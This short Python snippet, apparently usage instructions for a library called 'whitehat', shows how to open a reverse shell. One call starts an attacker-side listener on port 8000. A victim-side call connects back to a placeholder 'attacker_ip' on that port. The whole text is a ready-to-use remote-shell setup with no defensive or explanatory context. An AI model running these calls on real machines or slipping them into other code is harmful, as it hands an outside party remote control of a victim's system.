import whitehat

## For attacker
whitehat.reverse_shell.attacker(8000)  # Your Port

## For victim
whitehat.reverse_shell.victim("attacker_ip", 8000) # (attacker_ip, attacker_port)
